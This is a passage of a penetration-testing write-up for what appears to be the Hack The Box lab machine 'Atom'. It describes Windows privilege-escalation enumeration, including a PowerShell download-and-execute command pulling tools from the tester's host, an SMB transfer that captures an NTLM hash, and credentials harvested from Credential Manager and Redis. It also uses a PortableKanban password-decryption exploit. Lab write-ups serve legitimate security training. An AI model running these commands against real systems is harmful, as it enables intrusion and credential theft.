# Shell as Jason

I did some basic privilege enumeration:

```cmd
C:\Users\jason\Desktop>whoami /all
whoami /all

USER INFORMATION
----------------

User Name  SID                                           
========== ==============================================
atom\jason S-1-5-21-1199094703-3580107816-3092147818-1002


GROUP INFORMATION
-----------------

Group Name                             Type             SID          Attributes                                        
====================================== ================ ============ ==================================================
Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE               Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                          Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
LOCAL                                  Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level Label            S-1-16-8192                                                    


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State   
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled 
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled

ERROR: Unable to get user claims information.

```

And netstat:

```cmd
C:\Users\jason\Desktop>netstat
netstat

Active Connections

  Proto  Local Address          Foreign Address        State
  TCP    10.10.10.237:445       10.10.14.39:34122      ESTABLISHED
  TCP    10.10.10.237:6379      10.10.14.239:33482     ESTABLISHED
  TCP    10.10.10.237:50771     10.10.14.239:4321      ESTABLISHED
  TCP    10.10.10.237:50930     10.10.14.39:https      ESTABLISHED

```

I had a poke around jason's files:

```cmd
C:\Users\jason\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 9793-C2E6

 Directory of C:\Users\jason\Desktop

04/02/2021  10:29 PM    <DIR>          .
04/02/2021  10:29 PM    <DIR>          ..
03/31/2021  02:09 AM             2,353 heedv1.lnk
03/31/2021  02:09 AM             2,353 heedv2.lnk
03/31/2021  02:09 AM             2,353 heedv3.lnk
06/02/2021  01:10 PM                34 user.txt
               4 File(s)          7,093 bytes
               2 Dir(s)   5,602,054,144 bytes free
```

And looked at the system info:

```cmd
C:\Users\jason>systeminfo
systeminfo

Host Name:                 ATOM
OS Name:                   Microsoft Windows 10 Pro
OS Version:                10.0.19042 N/A Build 19042
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          barry
Registered Organization:   
Product ID:                00330-80112-18556-AA358
Original Install Date:     4/1/2021, 3:57:31 AM
System Boot Time:          6/25/2021, 9:40:23 AM
System Manufacturer:       VMware, Inc.
System Model:              VMware7,1
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
BIOS Version:              VMware, Inc. VMW71.00V.13989454.B64.1906190538, 6/19/2019
Windows Directory:         C:\WINDOWS
System Directory:          C:\WINDOWS\system32
Boot Device:               \Device\HarddiskVolume3
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC-08:00) Pacific Time (US & Canada)
Total Physical Memory:     4,095 MB
Available Physical Memory: 2,792 MB
Virtual Memory: Max Size:  5,503 MB
Virtual Memory: Available: 4,260 MB
Virtual Memory: In Use:    1,243 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              \\ATOM
Hotfix(s):                 9 Hotfix(s) Installed.
                           [01]: KB4601554
                           [02]: KB4562830
                           [03]: KB4570334
                           [04]: KB4577586
                           [05]: KB4580325
                           [06]: KB4586864
                           [07]: KB4589212
                           [08]: KB5000842
                           [09]: KB5000981
Network Card(s):           1 NIC(s) Installed.
                           [01]: vmxnet3 Ethernet Adapter
                                 Connection Name: Ethernet0
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.237
                                 [02]: fe80::6df8:22:7a70:9ec5
                                 [03]: dead:beef::6da8:a31c:7baf:425d
                                 [04]: dead:beef::6df8:22:7a70:9ec5
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
```

The version of windows is pretty recent and has a lot of hotfixes. I decided to run winPEAS to enumerate further.

## WinPEAS

I couldn't get it with IEX:

```cmd
C:\Users>powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.16.211:8000/winPEASany.exe')"            
powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.16.211:8000/winPEASany.exe')"
IEX : At line:6 char:8
+ *V(3
+        ~
Missing closing ')' in expression.
At line:10 char:2
+ ,/('
+  ~

...[lots of errors]...

Missing closing '}' in statement block or type definition.
Not all parse errors were reported.  Correct the reported errors and try again.
At line:1 char:1
+ IEX(New-Object Net.WebClient).downloadString('http://10.10.16.211:800 ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ParserError: (:) [Invoke-Expression], ParseException
    + FullyQualifiedErrorId : MissingEndParenthesisInExpression,Microsoft.PowerShell.Commands.InvokeExpressionCommand
```

So I used `impacket-smbserver` instead. On my local machine:

```bash
┌──(mac㉿kali)-[~]
└─$ cd Documents/enum/
┌──(mac㉿kali)-[~/Documents/enum]
└─$ sudo impacket-smbserver share .
[sudo] password for mac: 
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.10.237,60924)
[*] AUTHENTICATE_MESSAGE (ATOM\jason,ATOM)
[*] User ATOM\jason authenticated successfully
[*] jason::ATOM:aaaaaaaaaaaaaaaa:a466af52f6c2f02a53ce6811c8e58383:0101000000000000009a7b8e726ad70177d2b432c50e06c300000000010010004200730075004a004800440073006b00030010004200730075004a004800440073006b0002001000430045004200540058004b004c006c0004001000430045004200540058004b004c006c0007000800009a7b8e726ad701060004000200000008003000300000000000000000000000002000003d1f2a5d9f565e972c5d55925af40a8257a7792a673eae1f0494bb48b60531490a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310036002e003200310031000000000000000000
[-] Unknown level for query path info! 0x109
[*] Disconnecting Share(1:IPC$)
[*] Disconnecting Share(2:SHARE)
[*] Closing down connection (10.10.10.237,60924)
[*] Remaining connections []
```

On the box:

```cmd
C:\Windows>cd %temp%
cd %temp%

C:\Users\jason\AppData\Local\Temp>copy \\10.10.16.211\share\winPEASany.exe .
copy \\10.10.16.211\share\winPEASany.exe .
        1 file(s) copied.

C:\Users\jason\AppData\Local\Temp>winPEASany.exe
winPEASany.exe
ANSI color bit for Windows is not set. If you are execcuting this from a Windows terminal inside the host you should run 'REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1' and then start a new CMD
```

Nice!

### WinPEAS Highlights

It shows where the SMB files are stored:

```cmd
    h'eed(1184)[C:\Users\jason\AppData\Roaming\heedv1\__update__\h'eed.exe] -- POwn: jason
    Permissions: jason [AllAccess]
    Possible DLL Hijacking folder: C:\Users\jason\AppData\Roaming\heedv1\__update__ (jason [AllAccess])
    Command Line: C:\Users\jason\AppData\Roaming\heedv1\__update__\h'eed.exe --updated --force-run
```

And found a few standard things such as unquoted paths. The scheduled processes told us a bit about how the node application is deployed:

```cmd
[+] Scheduled Applications --Non Microsoft--
   [?] Check if you can modify other users scheduled binaries https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries
    (ATOM\Administrator) SoftwareUpdates: C:\Users\jason\appdata\roaming\cache\run.bat 
    Permissions file: jason [WriteData/CreateFiles AllAccess]
    Permissions folder(DLL Hijacking): jason [WriteData/CreateFiles AllAccess]
    Trigger: At log on of ATOM\jason
    
   =================================================================================================

    (ATOM\Administrator) UpdateServer: C:\Users\jason\appdata\roaming\cache\http-server.bat 
    Permissions file: jason [WriteData/CreateFiles AllAccess]
    Permissions folder(DLL Hijacking): jason [WriteData/CreateFiles AllAccess]
    Trigger: At log on of ATOM\jason
    
   =================================================================================================
```

It also enumerated open ports:

```cmd
  [+] Current TCP Listening Ports
   [?] Check for services restricted from the outside 
  Enumerating IPv4 connections

  Protocol   Local Address         Local Port    Remote Address        Remote Port     State             Process ID      Process Name

  TCP        0.0.0.0               80            0.0.0.0               0               Listening         2580            httpd
  TCP        0.0.0.0               135           0.0.0.0               0               Listening         928             svchost
  TCP        0.0.0.0               443           0.0.0.0               0               Listening         2580            httpd
  TCP        0.0.0.0               445           0.0.0.0               0               Listening         4               System
  TCP        0.0.0.0               5040          0.0.0.0               0               Listening         5820            svchost
  TCP        0.0.0.0               5985          0.0.0.0               0               Listening         4               System
  TCP        0.0.0.0               6379          0.0.0.0               0               Listening         1544            redis-server
  TCP        0.0.0.0               8081          0.0.0.0               0               Listening         4596            C:\Program Files\nodejs\node.exe
  TCP        0.0.0.0               8082          0.0.0.0               0               Listening         1900            C:\Program Files\nodejs\node.exe
  TCP        0.0.0.0               8083          0.0.0.0               0               Listening         2000            C:\Program Files\nodejs\node.exe
  TCP        0.0.0.0               47001         0.0.0.0               0               Listening         4               System
  TCP        0.0.0.0               49664         0.0.0.0               0               Listening         684             lsass
  TCP        0.0.0.0               49665         0.0.0.0               0               Listening         532             wininit
  TCP        0.0.0.0               49666         0.0.0.0               0               Listening         1056            svchost
  TCP        0.0.0.0               49667         0.0.0.0               0               Listening         1572            svchost
  TCP        0.0.0.0               49668         0.0.0.0               0               Listening         2112            spoolsv
  TCP        0.0.0.0               49669         0.0.0.0               0               Listening         672             services
  TCP        10.10.10.237          139           0.0.0.0               0               Listening         4               System
  TCP        10.10.10.237          445           10.10.16.211          42294           Established       4               System
  TCP        10.10.10.237          58568         10.10.16.211          443             Established       1184            C:\Users\jason\AppData\Roaming\heedv1\__update__\h'eed.exe
  TCP        10.10.10.237          60900         10.10.16.211          443             Established       6792            C:\Users\jason\AppData\Roaming\heedv1\__update__\h'eed.exe
  TCP        10.10.10.237          60924         10.10.16.211          445             Established       4               System

  Enumerating IPv6 connections

  Protocol   Local Address                               Local Port    Remote Address                              Remote Port     State             Process ID      Process Name

  TCP        [::]                                        80            [::]                                        0               Listening         2580            httpd
  TCP        [::]                                        135           [::]                                        0               Listening         928             svchost
  TCP        [::]                                        443           [::]                                        0               Listening         2580            httpd
  TCP        [::]                                        445           [::]                                        0               Listening         4               System
  TCP        [::]                                        5985          [::]                                        0               Listening         4               System
  TCP        [::]                                        6379          [::]                                        0               Listening         1544            redis-server
  TCP        [::]                                        47001         [::]                                        0               Listening         4               System
  TCP        [::]                                        49664         [::]                                        0               Listening         684             lsass
  TCP        [::]                                        49665         [::]                                        0               Listening         532             wininit
  TCP        [::]                                        49666         [::]                                        0               Listening         1056            svchost
  TCP        [::]                                        49667         [::]                                        0               Listening         1572            svchost
  TCP        [::]                                        49668         [::]                                        0               Listening         2112            spoolsv
  TCP        [::]                                        49669         [::]                                        0               Listening         672             services
```

This shows us the Node servers, as well as Redis which we saw on our initial `nmap` scan.

Crucially, it finds a password in Credential manager, `kidvscat_electron_@123`:

```cmd
  =========================================(Windows Credentials)=========================================

  [+] Checking Windows Vault
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#credentials-manager-windows-vault
    Not Found

  [+] Checking Credential manager
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#credentials-manager-windows-vault
    [!] Warning: if password contains non-printable characters, it will be printed as unicode base64 encoded string


     Username:              ATOM\jason
     Password:               kidvscat_electron_@123
     Target:                ATOM\jason
     PersistenceType:       Enterprise
     LastWriteTime:         3/31/2021 2:53:49 AM

   =================================================================================================
```

We'll use this later.

## Node Servers

I played around a bit with `run.bat`, which seems to start the node servers:

```cmd
type C:\Users\jason\appdata\roaming\cache\run.bat
@echo off

:LOOP

echo Running Executables

START /B C:\Users\jason\appdata\Local\programs\heedv1\heedv1.exe > nul
START /B C:\Users\jason\appdata\Local\programs\heedv2\heedv2.exe > nul
START /B C:\Users\jason\appdata\Local\programs\heedv3\heedv3.exe > nul

echo Wait for updates

ping -n 30 127.0.0.1 > nul

echo Killing Executables

taskkill /F /IM heedv1.exe
taskkill /F /IM heedv2.exe
taskkill /F /IM heedv3.exe

ping -n 30 127.0.0.1 > nul

cls

GOTO :LOOP

:EXIT
C:\Users\jason\Desktop>type C:\Users\jason\appdata\roaming\cache\http-server.bat
type C:\Users\jason\appdata\roaming\cache\http-server.bat
@echo off

echo Starting servers

START /B c:\users\jason\downloads\node_modules\.bin\http-server c:\software_updates\client1 -p 8081
START /B c:\users\jason\downloads\node_modules\.bin\http-server c:\software_updates\client2 -p 8082
START /B c:\users\jason\downloads\node_modules\.bin\http-server c:\software_updates\client3 -p 8083
```

`C:\Program Files\nodejs\node.exe` is running on these ports according to winpeas. While the ports were listening on all interfaces, they couldn't be accessed in the browser. `nmap` showed them as filtered:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/atom]
└─$ nmap -sC -sV -p 8081,8082,8083 -oA nmap/atom-node 10.10.10.237
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-26 11:15 BST
Nmap scan report for atom.htb (10.10.10.237)
Host is up (0.021s latency).

PORT     STATE    SERVICE         VERSION
8081/tcp filtered blackice-icecap
8082/tcp filtered blackice-alerts
8083/tcp filtered us-srv

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 2.71 seconds
```

I tried IWR locally in case they were only accessible from localhost:

```bash
C:\Users\jason\Desktop>powershell "Invoke-WebRequest http://localhost:8081"
powershell "Invoke-WebRequest http://localhost:8081"
Invoke-WebRequest : The response content cannot be parsed because the Internet Explorer engine is not available, or 
Internet Explorer's first-launch configuration is not complete. Specify the UseBasicParsing parameter and try again. 
At line:1 char:1
+ Invoke-WebRequest http://localhost:8081
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotImplemented: (:) [Invoke-WebRequest], NotSupportedException
    + FullyQualifiedErrorId : WebCmdletIEDomNotSupportedException,Microsoft.PowerShell.Commands.InvokeWebRequestComman 
   d
 
```

This didn't seem to go anywhere.

I looked at a couple of articles about pentesting NodeJS: [https://resources.infosecinstitute.com/topic/penetration-testing-node-js-applications-part-1/](https://resources.infosecinstitute.com/topic/penetration-testing-node-js-applications-part-1/)

And used tasklist to see who is running the process:

```cmd
C:\Users\jason\AppData\Local\Programs\heedv1>tasklist /v
tasklist /v

Image Name                     PID Session Name        Session#    Mem Usage Status          User Name                                              CPU Time Window Title                                                            
========================= ======== ================ =========== ============ =============== ================================================== ============ ========================================================================


redis-server.exe              1544 Services                   0     19,776 K Unknown         N/A                                                     0:00:00 N/A                                                                     
node.exe                      4596 Console                    1      8,064 K Unknown         ATOM\jason                                              0:00:04 N/A                                                                     
node.exe                      1900 Console                    1      7,976 K Unknown         ATOM\jason                                              0:00:03 N/A                                                                     
node.exe                      2000 Console                    1      7,976 K Unknown         ATOM\jason                                              0:00:02 N/A           

```

As it's Jason, I doubt Node is the right path to privilege escalation.

## Redis & PortableKanban

I went back to the potential password from credential manager: `kidvscat_electron_@123`

Could we use this with one of original services discovered by nmap?

### Trying redis-cli

I'd never used Redis before, so checked [Hacktricks](https://book.hacktricks.xyz/pentesting/6379-pentesting-redis) - I always like doing this for a new service.

It recommends `redis-tools` for connecting:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/atom]
└─$ sudo apt install redis-tools
```

The CLI is super nice, and autofills!

![[Pasted image 20210626114517.png]]

... but unfortunately it doesn't work.

```bash
┌──(mac㉿kali)-[~/Documents/HTB/atom]
└─$ redis-cli -h 10.10.10.237 -p 6379
10.10.10.237:6379> info
NOAUTH Authentication required.
10.10.10.237:6379> AUTH jason kidvscat_electron_@123
(error) ERR wrong number of arguments for 'auth' command
10.10.10.237:6379> AUTH jason kidvscat_electron_@123
(error) ERR wrong number of arguments for 'auth' command
10.10.10.237:6379> AUTH kidvscat_electron_@123
(error) ERR invalid password
```

It seems like Redis < 6.0 only supports password. There's no way to check version without the `INFO` command, which we can't run unauthenticated. I tried a couple more times, but couldn't get it to work:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/atom]
└─$ redis-cli -h 10.10.10.237 -p 6379 -a kidvscat_electron_@123
Warning: Using a password with '-a' or '-u' option on the command line interface may not be safe.
Warning: AUTH failed
10.10.10.237:6379> 
┌──(mac㉿kali)-[~/Documents/HTB/atom]
└─$ redis-cli -h 10.10.10.237 -p 6379 -u jason -a kidvscat_electron_@123
Invalid URI scheme
```

I tried using the password with `evil-winrm`:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/atom]
└─$ sudo gem install evil-winrm
Fetching multi_json-1.15.0.gem
...[snip]...
Successfully installed winrm-fs-1.3.5
Happy hacking! :)
Successfully install ...[snip]...
┌──(mac㉿kali)-[~/Documents/HTB/atom]
└─$ evil-winrm -u jason -p 'kidvscat_electron_@123' -i 10.10.10.237

Evil-WinRM shell v2.4

Info: Establishing connection to remote endpoint

Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError

Error: Exiting with code 1
```

But it didn't work.

### Digging Around PortableKanban

I continued enumerating files to see if there was another password, or another place to use the password. I stumbled across `PortableKanban` in Jason's downloads directory:

```bash
C:\Users\jason\Downloads>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 9793-C2E6

 Directory of C:\Users\jason\Downloads

04/02/2021  08:00 AM    <DIR>          .
04/02/2021  08:00 AM    <DIR>          ..
03/31/2021  02:36 AM    <DIR>          node_modules
04/02/2021  08:21 PM    <DIR>          PortableKanban
               0 File(s)              0 bytes
               4 Dir(s)   5,666,607,104 bytes free
```

I'd seen this before on writeups of [Sharp](https://0xdf.gitlab.io/2021/05/01/htb-sharp.html). There is an [exploit](https://www.exploit-db.com/exploits/49409) available which decrypts passwords in the `PortableKanban.pk3` file, but it doesn't exist:

```cmd
C:\Users\jason\Downloads\PortableKanban>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 9793-C2E6

 Directory of C:\Users\jason\Downloads\PortableKanban

04/02/2021  08:21 PM    <DIR>          .
04/02/2021  08:21 PM    <DIR>          ..
02/27/2013  08:06 AM            58,368 CommandLine.dll
11/08/2017  01:52 PM           141,312 CsvHelper.dll
06/22/2016  09:31 PM           456,704 DotNetZip.dll
04/02/2021  07:44 AM    <DIR>          Files
11/23/2017  04:29 PM            23,040 Itenso.Rtf.Converter.Html.dll
11/23/2017  04:29 PM            75,776 Itenso.Rtf.Interpreter.dll
11/23/2017  04:29 PM            32,768 Itenso.Rtf.Parser.dll
11/23/2017  04:29 PM            19,968 Itenso.Sys.dll
11/23/2017  04:29 PM           376,832 MsgReader.dll
07/03/2014  10:20 PM           133,296 Ookii.Dialogs.dll
04/02/2021  07:17 AM    <DIR>          Plugins
04/02/2021  08:22 PM             5,920 PortableKanban.cfg
01/04/2018  09:12 PM           118,184 PortableKanban.Data.dll
01/04/2018  09:12 PM         1,878,440 PortableKanban.exe
01/04/2018  09:12 PM            31,144 PortableKanban.Extensions.dll
04/02/2021  07:21 AM               172 PortableKanban.pk3.lock
09/06/2017  12:18 PM           413,184 ServiceStack.Common.dll
09/06/2017  12:17 PM           137,216 ServiceStack.Interfaces.dll
09/06/2017  12:02 PM           292,352 ServiceStack.Redis.dll
09/06/2017  04:38 AM           411,648 ServiceStack.Text.dll
01/04/2018  09:14 PM         1,050,092 User Guide.pdf
              19 File(s)      5,656,416 bytes

```

We can try it on the lock file, but it doesn't look to have a password in it:

```cmd
C:\Users\jason\Downloads\PortableKanban>type PortableKanban.pk3.lock
type PortableKanban.pk3.lock
{"MachineName":"ATOM","UserName":"jason","SID":"S-1-5-21-1199094703-3580107816-3092147818-1002","AppPath":"C:\\Users\\jason\\Downloads\\PortableKanban\\PortableKanban.exe"}
```

The db password field used in sharp wasn't there, so I thought I'd move on. Maybe there's something in the config:

```cmd
C:\Users\jason\Downloads\PortableKanban>type PortableKanban.cfg
type PortableKanban.cfg
{"RoamingSettings":{"DataSource":"RedisServer","DbServer":"localhost","DbPort":6379,"DbEncPassword":"Odh7N3L9aVSeHQmgK/nj7RQL8MEYCUMb","DbServer2":"","DbPort2":6379,"DbEncPassword2":"","DbIndex":0,"DbSsl":false,"DbTimeout":10,"FlushChanges":true,"UpdateInterval":5,"AutoUpdate":true,"Caption":"My Tasks","RightClickAction":"Nothing","DateTimeFormat":"ddd, M/d/yyyy h:mm tt","BoardForeColor":"WhiteSmoke","BoardBackColor":"DimGray","ViewTabsFont":"Segoe UI, 

...[snip]...

```

`DbEncPassword` catches my eye: `Odh7N3L9aVSeHQmgK/nj7RQL8MEYCUMb`

PortableKanban is maybe storing its passwords in Redis. However, the `DbEncPassword` doesn't work to authenticate to Redis:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/atom]
└─$ redis-cli -h 10.10.10.237 -p 6379 -a Odh7N3L9aVSeHQmgK/nj7RQL8MEYCUMb
Warning: Using a password with '-a' or '-u' option on the command line interface may not be safe.
Warning: AUTH failed
10.10.10.237:6379> 
┌──(mac㉿kali)-[~/Documents/HTB/atom]
└─$ echo 'Odh7N3L9aVSeHQmgK/nj7RQL8MEYCUMb' | base64 -d
```

And it also doesn't decode using the decryption exploit.

### Finding Password in Redis Config

I got a small hint and looked through the Redis config files as well:

```bash
C:\Users\jason\.config>cd \Program Files\Redis
cd \Program Files\Redis

C:\Program Files\Redis>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 9793-C2E6

 Directory of C:\Program Files\Redis

06/25/2021  09:41 AM    <DIR>          .
06/25/2021  09:41 AM    <DIR>          ..
07/01/2016  03:54 PM             1,024 EventLog.dll
04/02/2021  07:31 AM    <DIR>          Logs
07/01/2016  03:52 PM            12,618 Redis on Windows Release Notes.docx
07/01/2016  03:52 PM            16,769 Redis on Windows.docx
07/01/2016  03:55 PM           406,016 redis-benchmark.exe
07/01/2016  03:55 PM         4,370,432 redis-benchmark.pdb
07/01/2016  03:55 PM           257,024 redis-check-aof.exe
07/01/2016  03:55 PM         3,518,464 redis-check-aof.pdb
07/01/2016  03:55 PM           268,288 redis-check-dump.exe
07/01/2016  03:55 PM         3,485,696 redis-check-dump.pdb
07/01/2016  03:55 PM           482,304 redis-cli.exe
07/01/2016  03:55 PM         4,517,888 redis-cli.pdb
07/01/2016  03:55 PM         1,553,408 redis-server.exe
07/01/2016  03:55 PM         6,909,952 redis-server.pdb
04/02/2021  07:39 AM            43,962 redis.windows-service.conf
04/02/2021  07:37 AM            43,960 redis.windows.conf
07/01/2016  09:17 AM            14,265 Windows Service Documentation.docx
              16 File(s)     25,902,070 bytes
               3 Dir(s)   5,663,842,304 bytes free

C:\Program Files\Redis>type redis.windows.conf
type redis.windows.conf
# Redis configuration file example
requirepass kidvscat_yes_kidvscat
...[snip]...
```

This gives us a password that we can authenticate with!

```bash
┌──(mac㉿kali)-[~/Documents/HTB/atom]
└─$ redis-cli -h 10.10.10.237 -p 6379 -a kidvscat_yes_kidvscat
Warning: Using a password with '-a' or '-u' option on the command line interface may not be safe.
10.10.10.237:6379> INFO
# Server
redis_version:3.0.504
redis_git_sha1:00000000
redis_git_dirty:0
redis_build_id:a4f7a6e86f2d60b3
redis_mode:standalone
os:Windows  
arch_bits:64
multiplexing_api:WinSock_IOCP
process_id:1544
run_id:d4c9cb03d154fdb9c0b0fb4b5d0df322cf3ff43c
tcp_port:6379
uptime_in_seconds:67618
uptime_in_days:0
hz:10
lru_clock:14094191
config_file:C:\Program Files\Redis\redis.windows-service.conf

...[snip]...

10.10.10.237:6379> CONFIG GET *
  1) "dbfilename"
  2) "dump.rdb"
  3) "requirepass"
  4) "kidvscat_yes_kidvscat"
  5) "masterauth"

...[snip]...
  
```

However, there are no keys containing a new password:

```cmd
10.10.10.237:6379> SELECT 0
OK
10.10.10.237:6379> SELECT 1
OK
10.10.10.237:6379[1]> KEYS *
(empty array)
10.10.10.237:6379[1]> SELECT 2
OK
10.10.10.237:6379[2]> KEYS *
(empty array)
10.10.10.237:6379[2]> SELECT 3
OK
10.10.10.237:6379[3]> KEYS *
(empty array)
10.10.10.237:6379[3]> SELECT 4
OK
10.10.10.237:6379[4]> KEYS *
(empty array)
10.10.10.237:6379[4]> 
┌──(mac㉿kali)-[~/Documents/HTB/atom]
└─$ redis-cli -h 10.10.10.237 -p 6379 -a kidvscat_yes_kidvscat
Warning: Using a password with '-a' or '-u' option on the command line interface may not be safe.
10.10.10.237:6379> keys *
1) "pk:urn:metadataclass:ffffffff-ffff-ffff-ffff-ffffffffffff"
2) "pk:ids:MetaDataClass"
3) "pk:urn:user:e8e29158-d70d-44b1-a1ba-4949d52790a0"
4) "pk:ids:User"
10.10.10.237:6379> 
```

I wasn't sure where to go from here. I took a couple of hints which suggested searching the keys was the right thing to do, so I wasn't sure where I was going wrong. I reset the box, and got the same result. I thought maybe PortableKanban had to be run to populate the keys entry, but wasn't sure how to do that.

### RedisDump

Instead, I looked for an alternative tool to dump the data - which is always a good thing to do if you're stuck but feel you're in the right direction.

I looked at [redis-dump](https://www.npmjs.com/package/redis-dump), which required Node to be installed:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/atom/to-serve]
└─$ which npm
┌──(mac㉿kali)-[~/Documents/HTB/atom/to-serve]
└─$ node -v
Command 'node' not found, but can be installed with:
sudo apt install nodejs
Do you want to install it? (N/y)y
sudo apt install nodejs
...[snip]...
┌──(mac㉿kali)-[~/Documents/HTB/atom/to-serve]
└─$ node -v
v12.21.0
┌──(mac㉿kali)-[~/Documents/HTB/atom/to-serve]
└─$ npm -v
Command 'npm' not found, but can be installed with:
sudo apt install npm
Do you want to install it? (N/y)y
sudo apt install npm
...[snip]...
```

Then we can install and run it:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/atom/to-serve]
└─$ sudo npm install redis-dump -g
┌──(mac㉿kali)-[~/Documents/HTB/atom/to-serve]
└─$ cd .. && redis-dump -h 10.10.10.237 -a kidvscat_yes_kidvscat > dump.txt
┌──(mac㉿kali)-[~/Documents/HTB/atom]
└─$ ls
 client1   dump.txt   heed_source              "heedv1'Setup1.0.2.php.exe"   latest.yml.old       nmap            send-payload.py   to-serve
 client2   heed.gpr  'heedv1 Setup 1.0.1.exe'   latest.yml                   latest.yml.php       redis-dump.py   send-payload.sh  "to-serveheed'setup.exe"
 client3   heed.rep  "heedv1'Setup1.0.1.exe"    latest.yml.example           latest.yml.working   results         smb               UAT_Testing_Procedures.pdf
┌──(mac㉿kali)-[~/Documents/HTB/atom]
└─$ cat dump.txt 
DEL     pk:ids:MetaDataClass
SADD    pk:ids:MetaDataClass ffffffff-ffff-ffff-ffff-ffffffffffff
DEL     pk:ids:User
SADD    pk:ids:User e8e29158-d70d-44b1-a1ba-4949d52790a0
SET     pk:urn:metadataclass:ffffffff-ffff-ffff-ffff-ffffffffffff '{"Id":"ffffffffffffffffffffffffffffffff","SchemaVersion":"4.2.0.0","SchemaVersionModified":"\\/Date(1617420120000-0700)\\/","SchemaVersionModifiedBy":"e8e29158d70d44b1a1ba4949d52790a0","SchemaVersionChecked":"\\/Date(-62135596800000-0000)\\/","SchemaVersionCheckedBy":"00000000000000000000000000000000","TimeStamp":637530169345346438}'
SET     pk:urn:user:e8e29158-d70d-44b1-a1ba-4949d52790a0 '{"Id":"e8e29158d70d44b1a1ba4949d52790a0","Name":"Administrator","Initials":"","Email":"","EncryptedPassword":"Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi","Role":"Admin","Inactive":false,"TimeStamp":637530169606440253}'
```

We get a new password: `Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi`

Now we can run the decrypt script:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/atom]
└─$ searchsploit portablekanban
----------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                         |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
PortableKanban 4.3.6578.38136 - Encrypted Password Retrieval                                                                                                           | windows/local/49409.py
----------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
┌──(mac㉿kali)-[~/Documents/HTB/atom]
└─$ searchsploit -m windows/local/49409.py
  Exploit: PortableKanban 4.3.6578.38136 - Encrypted Password Retrieval
      URL: https://www.exploit-db.com/exploits/49409
     Path: /usr/share/exploitdb/exploits/windows/local/49409.py
File Type: Python script, ASCII text executable, with CRLF line terminators

Copied to: /home/mac/Documents/HTB/atom/49409.py
```

We have to edit the script to use just one password (as we don't have a `.pk3` file to supply):

```bash
┌──(mac㉿kali)-[~/Documents/HTB/atom]
└─$ cat 49409.py 
# Exploit Title: PortableKanban 4.3.6578.38136 - Encrypted Password Retrieval
# Date: 9 Jan 2021
# Exploit Author: rootabeta
# Vendor Homepage: The original page, https://dmitryivanov.net/, cannot be found at this time of writing. The vulnerable software can be downloaded from https://www.softpedia.com/get/Office-tools/Diary-Organizers-Calendar/Portable-Kanban.shtml
